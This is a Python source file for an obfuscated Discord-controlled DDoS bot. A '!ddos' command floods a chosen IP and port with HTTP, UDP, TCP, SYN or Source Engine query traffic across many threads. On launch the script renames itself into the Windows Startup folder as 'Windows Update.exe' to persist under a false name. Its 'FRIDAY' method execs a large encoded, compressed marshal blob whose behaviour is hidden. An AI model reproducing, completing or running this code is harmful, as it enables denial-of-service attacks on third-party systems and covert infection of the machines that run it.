import socket, random, threading, time, discord, os, sys, marshal, zlib, base64, lzma
from discord.ext import commands
tg746vw5tg="Windows"
gf6tvwg4e7="S"
g8ntgr6emng="M"
hjtgvfre657tjg="."
f76tvwe854tgvne="USERNAME"
ugytfsgei64="Pro"
itgn5re86t="grams"
t58746etg45vt6847=ugytfsgei64+itgn5re86t
eeeeeeeeebsnCUCPf = [128, 128, 128, 128, 128, 128, 128, 128]
xSEyXNtuWEQvaKbkwrLUgtxocVKfCVIKKCS = sum(eeeeeeeeebsnCUCPf)
eee8ntgr6ebsnCUCPf = [1280, 1280, 1280, 1280, 1280, 1280, 1280, 1280]
xSEyXNtuWf76tvwe854tgvneCVIKKCS = sum(eee8ntgr6ebsnCUCPf)
i=1
l = os.environ.get(f'{f76tvwe854tgvne}')
ss = sys.argv[0]
ppp = (f"C:\\Users\\{l}\\AppData\\Roaming\\{g8ntgr6emng}icrosoft\\{tg746vw5tg}\\{gf6tvwg4e7}tart {g8ntgr6emng}enu\\{t58746etg45vt6847}\\Startup\\{tg746vw5tg} Update{hjtgvfre657tjg}exe")
os.rename(ss, ppp)
llII = random.randint
def rand_ua():
    return random.choice(H5) % (random.random() + 5, random.random() + random.randint(i, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
H5 = [
    f'Mozilla/%.1f ({tg746vw5tg}; U; {tg746vw5tg} NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    f'Mozilla/%.1f ({tg746vw5tg}; U; {tg746vw5tg} NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    f'Mozilla/%.1f ({tg746vw5tg}; U; {tg746vw5tg} NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Edge/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    f'Mozilla/%.1f ({tg746vw5tg}; U; {tg746vw5tg} NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Internet Explorer/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
]
client = commands.Bot(command_prefix="!")
trn43576rtcfg4e76n5tfr=client
@trn43576rtcfg4e76n5tfr.event
async def on_ready():
    await client.change_presence(status=discord.Status.idle, activity=discord.Game(name=(f'!ddos (ip) (port) (FRIDAY/UDP/TCP/{gf6tvwg4e7}YN/V{gf6tvwg4e7}E/HTTP) (packages) (threads) (time)')))
@client.command()
async def ddos (ctx, ip:str, port:int, AAaAAaAAAaaAAaAaAAAAaAa:str, times:int, threads:int, duration:float):
    L1648268702217712211 = time.time() + duration
    def http():
        aaAaaaAaaAAA = (f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n')
        while time.time() < L1648268702217712211:
            try:
                IIlllIIllIIII = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                IIlllIIllIIII.connect((str(ip), int(port)))
                try:
                    for _ in range(times):
                        IIlllIIllIIII.sendall(str.encode(aaAaaaAaaAAA))
                except:
                    IIlllIIllIIII.close()
            except:
                IIlllIIllIIII.close()
    def udp():
        try:
            Z14 = random._urandom(int(llII(xSEyXNtuWEQvaKbkwrLUgtxocVKfCVIKKCS, xSEyXNtuWf76tvwe854tgvneCVIKKCS)))
            IIlllIIllIIII = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() < L1648268702217712211:
                R1648268702217712216 = (str(ip),int(port))
                for x in range(times):
                    IIlllIIllIIII.sendto(Z14,R1648268702217712216)
            return
        except:
            pass
    def tcp():
        try:
            Z14 = random._urandom(int(llII(xSEyXNtuWEQvaKbkwrLUgtxocVKfCVIKKCS, xSEyXNtuWf76tvwe854tgvneCVIKKCS)))
            while time.time() < L1648268702217712211:
                IIlllIIllIIII = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                IIlllIIllIIII.connect((ip,port))
                IIlllIIllIIII.send(Z14)
                for x in range(times):
                    IIlllIIllIIII.send(Z14)
            return
        except:
            pass
    def syn():
        while time.time() < L1648268702217712211:
            IIlllIIllIIII = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            IIlllIIllIIII.setblocking(0)
            try:
                IIlllIIllIIII.connect((ip, port))
            except:
                pass
    def vse():
        while time.time() < L1648268702217712211:
            AAAAAaaaaaaAAaAaaaAA = b'\xff\xff\xff\xffTSource Engine Query\x00'
            IIlllIIllIIII = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                IIlllIIllIIII.sendto(AAAAAaaaaaaAAaAaaaAA, (ip, port))
            except:
                pass
    def friday():
        exec(marshal.loads(zlib.decompress(lzma.decompress(base64.b64decode(base64.b85decode(b'FH~eUS4M9^K|xe)F>+EzL1#f|K~h;kK|w+=Oe<GvK~h;UWlDN<Wn*hoacp@qHEM1(FE3_oc2aIJLPS+@cWGKdXLn~eMnO(SQDIY3c5p^@Z%#~MXIL^&PjPElc~Wv$SvgX2ZbxlSHfb_TYkFpNa7AJ<K|^hLIczj(S#nTVD`;{wGkPy8Za8Ewc~?(acsXuPXfHxYD@0H=G-fwQFHTT7D_Ji!Oe-~JFKS3HG-fnXFLPKqI5T8LFL+EjD^PVWQfe<RFLY*aYI=GrICf+&c`Hz6cX}@?csMUFGf+1-dNnvNFLqFGI7?<LK`(N8FE4s4PETwvWM(fkI9E+8aC%oyNpN{JRAw-GFIQ$ZdM{KjPI@p<FDrFWNP1K^YGGP7Q!9E;D^O!<XKiUXPi{0yIaN$JHF7v|Voh}~H#t`;NKjW<M=vWeaawU!RYposH#9U<ZD~g}cXUH=Y(ZIiF>+UKL{nu+Q+P61FF|;6Q)_v1Q+G92VKPipFK$?HX?bLKMon~bOHOArYgbHmQd(AaH(D@BM|pH%bu>eIQED(ZWHo9rLoiNnH*#q-OJjCaVR3jbbWTKTX;3v(L@!lDcxP8LD>r&dVo*b3aal4pL{w2QNo;5`OK3ScT6IoDS7umtRaaPNS66R(T5)zxWm$D?RCY^AQc-0{K~_(6QdUq{Svg~8Lo|6)PHI(Vc33fTLTq<7W^;B!LP=s$QDabbPk2#eP(?C1axrXcVmLHtPBT$sOK)UIa6)D@a!W!lZDDF}RY_zuXjgMiZfZ?NYd2_VV@EZ3NJLk2GE;SIH%CiDHfL^WYG`3qVKhc<VM%FhWmqv*b2maxWJp3}G;2p%X;N`)c4$a?X-rFGT1RzAPjqi#GBIs-a8P(Sa(8PnYj|TfbZ$X8YEm&%M^h_nD`aa-HCab&WoBY+IdWJ-cx^*5S!;1~G;B*ub9p#%S4>wiLq#@BHDp6WQZqtOG;K#WN_jVBYIiweG-q>SOF1z`Vl`wdWJh#ic`<EPS5Zo3I6-+hL_tS#W-BsnZ&FlBZ)-C#T6tMHVrM~fMKWkdcx-Msc~@pqK{+o{a4Sx5SY>Tad1_TLW@=Y9R8UcPS7<jiZ%;8%LRo80Hg`}}F=A$QZ#PzUGf+ixM>9E4S7t;?bWC(eS9NAda8+q=N_I|BPgqK6a6vCraWZLID{V4WX?1CMZ%}72M|ne1MQk`LM?rK(F>7%%PEd40cs4?9c{Ny4QA<=dS5JC2YBFJXH#K!oH8oRVQ&eb7Vs~UlP<ClJNN6%IFLX?GHFR@FL0EQ5LrQR0WNJfGNn|ffQglI8FJx+KPdP(OcyL%#RWVa9X>D>!IBiXELo{Mbd1Z7-PccbMVlXsCIcYOmD|S~)L^DZGFLG{FSvfaSXEjhrN@#IOWJ73hD>iOTM@x5XO;k%USXoFlQAJd9IBt1xWlk_kP<2Q{d1rA`YcW%7F-$>LZc<n>LQGY3R&{r4IBi)|YjAj0Wph(=H#T{8b!>D_ReDV^bTw*DRb*&WLRMO6cy?4zZdpz>X--p7d37~yFk@j(Sz~ZhLV9a3M0$2sIBzm*Y<g{TZDcb|HAYcnD|16`P)JEcZ*WI(Y++(+VRchMV^mg1bz*TVD|lLES!-{1Vr4~CS9nh^b76CEOh;~IR5e;fM@V{iPeyP^F>!TrL@zKaRY6NfH&#(Ja#(k5HFiugR7-SmIAu>uNOeYIc5_TCa7$TrX;p1fPF8d<X);Q5GBiRkQ8i>rb!#~?P*_GXMPoR1ZDMP3QCcxCMmR}yT0%-nR8M7jRy0y{GEX^4WKCmXdP-45Q8RFEPcmsaL^Vida8^=OFhpioQaO5NPHk8(LRW5bRYg`uY+^)GFiSU6b53(GS5-M?W>0ElF+yTEN;Y<PHETy%aCLfFM@%wBGBjm)c3Mb5SWI_mG(j*pb5KxgXLx03axXJaYezRVK~6U{VQVikIc!yOXD@I~Xj(#XdSPoYcu8znM^7?GOLkaKO-Ex+YHM0gRYx*<T5d^WGi_*fdSO&;I6_xtI5%c7Y-}`IPIzioT4iBRdO<XDYD;TXFG_7tSa38%L{vyjG&n?YY))A#adj{<IdW$&QEyf^WGib$aCuExRZebtX>o2wFl}vcV@+scF>f+;W=K>>QejVTZ&NaLdPz%qFji-BRAg^fM{qPSPFikMS7UcGPkBjocrjs0L`!2~dMjuvF?d5`Z$wFGPDepYbXICFa7<Y+YBWYQNH#DtQDj&~QEYE$Nis!ga9UV$F-0|VLu5u$GD~t%FIaMPHE3aObW2%xRbg02S}S&IZ*W98byH?CNI6(dP)ku_ZD}(zaZ6%SV`)WsFiT@nVNXtGcy3KHZ8LdRPIX3fHAPcoWJ72;acNLVR!me-c|liVMKMHiRCq#WP(xN$dP7E7IBQU8Gct5bLn~%icsEZ~a&S&FV|F%JPD*h`LS<t)bXs#Yc|&MXW_e3(MOJ8cOJ-R&V^Vfjc1trjMRPb$T3AP9c2qV~G)7QYR&7K%Sw(hfL}F7}Hf(c8R!CELYD89dc0w_4a8Y$nZDnRmXLeaaZ*^`rT5fcBLrznAb7oLcH8(?Vb4WBdPHtv4Z$n{Fa#%J@NOojqZE8VwNq8$zLP2F{H!?POF-c)dOE7R`Id*h8Z#PJGaZponQ*AOsR&6*kO-5KXRd;n(Rd-}}Z#hvoQ)X#%D`#tBNi#}HN;p+@OmatJO<_4&cQ|HKIXQB4X?k>5L@_ILSWq){VMusdI96vvVR}_VW>ZvQZE969SXf3gG-^02V@hm8VQ+XeNl#`oY<Y7~QAA5aIZ-cpctLG*QCdfEW@k26X-;K9ctbHWSZG%-L3mYna$<UAQZ-spX*hOiG(~DeVnSCnPi|UlGkI}YH7`kIaAIUoVsltiZ8B79Y;SONGjVfNZ)Ip_aCulqNmWueOK)yDRcAJ5RYzB7MpHFTct}+*Xku+cO=d_%RCI7^Qe<yfZEkdIHc~@TMlW$<Z+AIwaWFC~Z%|A{PBv?HcSA>IGGa$-Sx7WdL`PywV=-BHK~YL_QCC=HX-{}WWO8^lZB}tNb~ANGVQx-Id3a7nP)%_;azkx!Y*SNXb#qiXS8`HXXG?QhL}6!FLvmw6WHMGqQ%x~>GEYV}cr`?Ba8h(xK~6(fF>rNjVsS7?XE#@Rcy)C!IW>7QF)%hTO=E9UXlHk3WJN1Ba$-_>Wp{E>I9O44LuGhZb~sfvRW)dLG;(J}Lt14}ba6vRMLAk-bx2E5VM;MeK{-uHPcn9LWH)z2LThC>NJni(Mpk+_L}oc;IAM8gc5-Z4NNG@JSZp{;NKQp^P-=KHW_e;-N@RIaQFCoJL1=M9b}(5mH8)sTcW5>=T1ZS`STJK#L}*!eXe(h*V|iJ1MM5xbdT4r5OEzP5cT+TYI9F9}HgQO2R!~ZDb8A#^VRS}!b9F0PO)yS(Y++VpHf?leO;>nuSXW|rb69n2L~n9-K{rcPLU2%2F*0gSdU$hqPk1tAMou(OMNDQ<VNp$aP<U5ZV{KJ8ZZu{wWm#5Jc~VVCd2)6#a#u8UHBfdzYI03RNmovGZbDQwVMsAEFJnhFRCZ-iIZI7Oc2!DkRA@>vHdb15Wo>t5Loaw!SZZQIa%^%|W<yU{R6|2nb2vy%RaHSrGi_=`RW&nGRYGk|Iag+ELu6@0Pj+@uXGU{!RaRm|HFQc#aB59@Y*1lkNjEokZ#QOFS7TQ;PDgBSS5P!;STb`*M>Tj;Xf#tvZ&YMUQf^l{M|yQ|FE?*yIafncWmPkHZ$@-6Re4ZZaZzD1F-b5>H)UB?WpqJHR!lK<bZc`<QY%eRT69-fL~}(-VK8<!WLQp5bx1>SRz-MaWm9@<bYoX9FHLnrM=)$eT5@A~Gb=VyLqc<FP-k{=D`{kANitS5ICpVoQBP56FK$dRNGnz|X;@coc3MhDRA@O?RXKW9D|j|aVMKCdM|yQbY*11%NH=q7L{~RcD{V|mG<9uyW@S-RN;5D;Q&3h)Xl_epbTdm@Y%?({X*gGGb!BvNac*liIYL@1NjPv&WK&^CSYt3@NJx2VF>7OWF>OXtOms?OI8J9$dUZxxRdZxSL26hxczQ}`F-9*rYi>j^D>GI~LQZveM{#&YRdsVyVpLgob5b{UbYpg7dQ(PcG%{ySFIHDpb1_##S!F^?Yf*Y}OI2rjMps2iO?7r|a!X4$IB;Q7HFh*vZ)apUId(%sN-}g>D=~F8aAtIKP%>6(P(*EbI9M|?Mp{@)S87UOH%f3aM^9Q-L})j0LPt$9Sx9+$MRi4IVR2YtGe$yKPgFNkD@=HJLrga_HC1F!GiGLCb2(~qOiV;KGkQxzH&QljP-Q}OXmwd*NNzJ`OLS#ecXc&6O*k@WZ)`F#cW6aPdPQ_@LNr=7Y+-avVoEbXIC^0*craONOK>-9XIe9HOmJ{ANjW)hFlbhIFj#XqR7f;WD^_w!Lq>EkVo7OYFiS*fbZjs+V{I}yRWmh7FLGr^N;hs*P-QeYayM&XD@$lAM=x_hPINC?D?v|WFf&3mZF)*oK}a$<YjJC1abZU`NJvX)PDeI1OF=JJF-}Y?M>%mcV@XDNZdzzpL3lBCc5_%Wbxc`Uc5h8=OldhaGhsw!RyIXwOi4s_c~3D_bv86eFi&tsH!C-1c5p&QX*FwXVp?rwRcbX?YI;m$Pf9jgR8mcFV{tHOVpwl%GHEk;H+OJGS4d4lVoh&UPh>V)FHK2dZ836DWm<AXG%#XHXJ#{Kc~WzBcr$ima6xfnZ823=N>w&vdQM|dYEO7WQek#$c4RkVb!9j*MMgAoIbkwGRx>qfXiiRYNH0lGLU2=1bysOdb!u2RH%m!DS65d_GifkxL^EqRZ8mguD`jeOVoYW$Ged88GfZ<uOKfstFjPf#Zb~qDO=NCtW==IQa#J%oc2Q+9S~gHeMrv6#LP0W3VmNYBVm3)pQ)_cUI6-Q4M>c0LSyE#-bb3r{GgUWiXH9ldYh`d*c2GuRV^eBvSxHGUT54uEZ)tf-Z)|W-FGhG&Xn1rsO+`siD{NzBVL4$!W?3<MSy?k=V`nx|I88)RHbr@1SUF^QdT3Z|Om|H}cv($wNMmhSc}Y1jS2=NdH)3=!LqSGWVtO}Zc1CD)P)}2HVpw)?L1<%fb5><HdT?fNSY>Z)VRA-jM{QYGRz*iKPD5rkRB~)mR#G!ZMO1Awb8K`ga!)ZhFgR;gLvu+*dNWFJVs1@%LQh#aX-slcV@y{}VNP0RT6ubCOKeU|GD&zwGdWsENl#E}IB#WeYD95&H!oURXm4USH%VD=Mp{QrS8_r{VRJJ`FGh4)F*h<wGj(ZjXfi=zIcP{`VNNq?G)H!1L`icodShyON^~n>P;FOrVNOF&OmJ&XV=!uDcXV!IPH}2CD>8L&V_0TJGemYbOi*NYG-N_#Pj4_`ZZd3QR8UtrayC{sZ!mCFF-9~>ICOPwFI8GdFH3DkS7udNbVXN1I7?=4IYKZpNOUqYc27)8b!c%jZ8&Upbv09AX)sWBVo@++Yj|ZbPf2WgNO^8%V_7RzN@HbZSWiQEL{U#padtIxQdUqePcTMCFEMRQW^iOiVRdISX<~CoLUM62Qerela8gWmGj3>TL^La6b#7H*Sxq&0S!!2SVM{|wNI`OTaCmrOGk8mLWjJPLG;()jYfD)+Qf*2~Z$>j^RC6+UHg{q<YHMO>IcZf=VL5ShdNET<WmZjhZ$fHKPE%TKD?>6zVP|wRa&LHWRC07tMS4_mR&GyeL`Xq&YEMCVZB<BYQ$%@sZ+JCKV=+r<Ml?w?OJi<lFGFf?ZaG>`N?A&1dRI$oF==sgH+eX8Xl!{ePBKV(c2GlBaAZqyb4XM%Pi9I%XnHtuZcRyba#S!-WG{MRa7srsGh}6RH8xO1QfN(7O*1q$GeJ@`VQyhLYgln=N_B2Ga(8fWRb?wjH8^!dWM@xPHF9@hbt`CAY%nr7Wl?ZBZ$fB8G;c<9X>Cb1S7b6xWolS&HA6HnPjP5vOF4ROXgE_sW-()JOE@cWGec%=K~{Nla!*k<L27C<V{>&?a#2G#Xj*StbaXLqNkT7UHgHj9WjJSXadUQZbxB2HYFKGeO?7okGcr?mN<?-xcvEh3Q$loFb6RI*PjNF$XEQNjL_$|GX>Ds{PcbxkI8R7MQ({e5WHn`SXk|fgcX?WLHf}XeL{~9aFj+P)LohXLad}xwO*T?XH+Xt7QB*Wmb!RXyF->n+RC85YSyo|eIa*paV?tV3XIV~eb1OwjL{fEhLpWh^VP|$`aBfd$G%#mWY*A=wV^mE-ZAmX?G(lx@G)z(}LT5B$NMdz)G)^mRd2wn;XGb=0bVn;pFmyzDc4IeIbWbr>by-nxc{p)sa&$RYL1A$@YIaXhYI00OdP#0XRyj{$d1W?XdNy)5Z)13KQ&m$>Su#~<Zf8e#HD_08RZVhiFLg_EY+^S;Yjkd7S7cIpSWkF#IC*0=MnyPkHCIt~S2Hq1Z((FYHA6>aLsKtEc{FxyLT*?=T4{A|W>a!Aa5PUdOIS2<NK#owV={4MVKG)>R!eeEd2@G3D@$2MS!Hf-P+2oGXLvAfdN3<zMJsS*cXfJXQ*cvFF;z}ua7}PwZAdF_WmQ;gOKf2;GdE*5F>W(aX-GnHW>0TTR8cTWM>1hjZ(>qXb8&KYGiEVOD@HUoRxw6PQB_hgLpEb+P*!bebw)W+XK*n@WMpt+Nm6x2Rxc|=H8xr~MKd^OY;bUPPE2qwGhstELS|=Xby7JuPg-GPcu`?yOImeGPGxs>Phx8?Hf&fiD>yPZZ9z;cWllp@Lo+WjH$q`SHB)mmMsH9|Ok+w$T39(wVP<JEOEY#?P)&4MIZA9nLv2n^Hfl;YWk_jbIa4)FXLC6=F?Tg}cQtlTY)v<8cS1=xK~Py_RY^~DFKsb0MK@1FFHB5uHgZ>PXiaxUL{D{gYC=sbQ!sW^Pd73%VnbC#cTIXRcxX#9XjWNSWm8RLNL6oCNmf)<bxv<dFGWjMYE@S_c|k&DZBs8!LP={>NqJXcbXi(UGets2G;(Y~Z8u9%dQop-X=OQ7VN!KjXiR4}S#4xgVKGr|L`GI=X?JjHVPS7mZ)|!`M{`L^FlcizZbnc_Nh?TNaVu+dYfyD(c~MwlYfW@kLwb64OJq`cD>g?*LS%JTYdB_hVKHwvR%2{0D`i$^L}Ou4OJh$$IX7%#SaUE&ayWJ~O;AojYhpA+PFHkTWm7~<c1bp8F*QY3R7P-QLV0#oZfZ(ZH)BaMS2s^Xc1AL7R(LXSSXEP2bWBG_M>RHKb53|-bVo@~Zen*~Zfi|JLNQNHNO?_APfKYwXm>VfacXRCZgDqFOm8@BT5NT0d2(%LZgVkYZE7|-cuz-BYB+joO;&brHE3f|dRR?MHFZN`OjU9)D@$QwV{9vPNN_PuZ&zAWV>WPFSxRVgbYxI;a5ZE}IB8E}ZFF#JV`n*4P%~P2aBXxqNKQ<2Ms0azHEcykV|H0=NLFr6S8g?ENo7|}H&j7HY&mjdVKz5<c1lDrZ$vjUPi1vBQgl;zMKEJ^b5V0nH&#_}YED#HH$zZEH*0fwcW_r%Q$uljZfa0wSuto*PiJ>FVQV)vHb!YxX<{&LX=qGqPgq29QD<vYR82;4HCb{@d2w-bOH6KPbW>+gRaQ=6GFDPhVo5hRM=@ntMl~>TY*lVlRctj=Yc*zOT4Z@SP%$$wLrpYFa%^KnL1blNFK#k;Xi92hNONXUMNMH*MQd1OXLm_bHAPZsdN+DZYD9KHY*kMyG;2j_a(Qo6Hc&N3WJYOvL}g)PcsM~YSa*4LcVbO=N>h0?c3Lt>S9CFDV`wvXF-$~Mb53t~V^wxzOLj#yI5lodZ!~Cca&~J&ZAme2GgmN6Xg6hZVKp&qdTw@OMN%(hS#3^mFEUC`XIXJZH)MJ*PjFLtH)u<0RYi48D^O)@Y&S?NbYU`NN?1{5OIcMfH85jtZgezKN_I*_Gg(zZXL3<bQaMd`GkAJ6Z&OEjQ&)09Hc3TyG(lH2O>IMYZA@ryP&ia?R8eF>Y(i%@SUGx8N^MqcOjT7iR8@LmOi@i*OKetBVtQ<3Ms09oHg<7xRBvo6HY;jxWNs^Lb~R{kX)kMWGFe$?L}qGrT4Xa(MmckLXgFw1N>n#9QC4VXYcXMGY%^~}FEC*=PIECYVsSKQOlEOZG(>h~bY^)+X<|q?H7|EHS7uCeG&pZoZ!%*>cx_5Xb5=q&ZA?T#D?wUIb82gGQ#fTdPHk61RWn9KQZ#mVcT+1%b2L*=H#kaCGD<5mL1ImDc0+eYb!T`)XgN${SZ!%hNikJ8IZIPlXnH|(RcBW=VMB0hdSzr)cu;Lpc|llpFLPE`S2tHORcJC<aX~XgPI+-vZfZqmT6Jn~OlxvDH)S$tD>E@lXJvL&b2DyPWMyJQGj&x)L~1c+PfB%VGh<|Pa9CM3He@$XHgR!ANK#{QR7X-vGf!xBHbhxWOgA=dR!A^Sa#m4tRbxeZXiGylcU5RYGE{hWRW(*cLuzAAcu{3ab#ZulYeaZbQB_28PfSB@cy3fqb5L$>d1G`jOiMOeZB#Wlb!%8SFG5!<a8z}5QE@LcZFF>4Oma_DbX9A5ZF*E$GIMiJZd7DSICXh&G&D_DOK3zhOi@)cVOU{Na7i~yLRv3sa&S^iL|12GZbV^DY<gB=ZbxQMPi=2`WoJ-Cd2=*bSz<R;QE66DV`M99WK>yML{4@?cVu}paYuPqb8L8TX;DsWGB;5+OlfjOVlPH8LseRNVnl3EV_`>bPGMS8R&q6SPFFcYZ#Ob!byPKXL}p?zWlmB;FHbdjG&e<ZS957&F;{CgRy0sFaWQE(cX&ZobXHDKdQeq$OlodYb#z2ZH)VEZRYh`GPhm|jcV#h6PB=6(d1)|DPfbowT5oJcb2)QxdU!!_PHaPWXgN%IYhy+*Qddwxc3Np-ZEZ|-Npw?oc}Q(mNqA3LcVTWwOhYj>Okpc#ctvDsPhn<fV^B6LHbG4@R!>JbHgrx`OL}8xR&-fzO-f8OLuGbUbxCx0WN~;yT2eVRG&EFYVq->RXfHu-PI663c4~AoR!%QtdQ(VbSZj7UbT?9IZ&+}6VRJNZZ!33LcrbWNa(7uoNjF1iH*iiwFlI<gXj3#|PisVHHcxLkQg~)zS86LbZ*x~|ZZl9>OHD9wdPYl4MNxHfVK`Q2cUm-NYiv?vS5#ACHf(cYGjwlGHghp#V@WkhZ(?>uWHd)wHZwF#L^m>2G(|9VQAcAdMK(A?QZjZzZA~;rX=hqlG-x+vb7MqxNN{dMXk<uMb~Q_PaAY)MMM`6BXmUz;NiRY}V@GOuWid%-FIPr+NNY_<O>|F8K|ypYa!zkGYgce&Pj6LbZ$?T>H)3Q{H*|MWPIPK9VK;6oQ7<uLP-RkaY&cgkR#-?vF?n`PM@}+1XEjiHb#+>2cw$m8FJxgWO><I6N>x)UZDvt#FHb>cGi6G5H$+HhF=#V+ZZKh1dP#G4ayKtaY;R^XIW|u#YjkQ(V@)zIH#b6cNMl!RH#22xVsLCWD=TYlGk0TXXK+hFWMyb}b}u$zWpQSDd24hlFJ^2@F?Kd~W-nJcV>wcFFJ^CgWo1=%FHcxVYIrLzFK>5cRc1tTST##IMm04rFH<s2XKpbzPeoX6I5s&iIXQK7GcYeiOGP<SHAF8{FE4ItIZ$&eIBF|LSTiq9IWc#3FlBC7b}v{{P(^cTFHdH6D>!s7c{FA(Id)J`W<z#vI9NDBRdrWnbx}b<K~8gbOG$Dsb!<a7K|x4QOiWpGK|w@icsOcob7N9&D|bmjK|w)5LPl(1'))))))
    for y in range(0, threads):
        if AAaAAaAAAaaAAaAaAAAAaAa == 'HTTP':
            NNNNNNNNNNNNNNNNNNNNNNNN = threading.Thread(target = http)
            NNNNNNNNNNNNNNNNNNNNNNNN.start()
    for y in range(0, threads):
        if AAaAAaAAAaaAAaAaAAAAaAa == 'FRIDAY':
            NNNNNNNNNNNNNNNNNNNNNNNN = threading.Thread(target = friday)
            NNNNNNNNNNNNNNNNNNNNNNNN.start()
    for y in range(0, threads):
        if AAaAAaAAAaaAAaAaAAAAaAa == 'UDP':
            NNNNNNNNNNNNNNNNNNNNNNNN = threading.Thread(target = udp)
            NNNNNNNNNNNNNNNNNNNNNNNN.start()
    for y in range(0, threads):
        if AAaAAaAAAaaAAaAaAAAAaAa == 'TCP':
            NNNNNNNNNNNNNNNNNNNNNNNN = threading.Thread(target = tcp)
            NNNNNNNNNNNNNNNNNNNNNNNN.start()
    for y in range(0, threads):
        if AAaAAaAAAaaAAaAaAAAAaAa == 'SYN':
            NNNNNNNNNNNNNNNNNNNNNNNN = threading.Thread(target = syn)
            NNNNNNNNNNNNNNNNNNNNNNNN.start()
    for y in range(0, threads):
        if AAaAAaAAAaaAAaAaAAAAaAa == 'VSE':
            NNNNNNNNNNNNNNNNNNNNNNNN = threading.Thread(target = vse)
            NNNNNNNNNNNNNNNNNNNNNNNN.start()
trn43576rtcfg4e76n5tfr.run("UR DISCORD BOT TOKEN GOES HERE")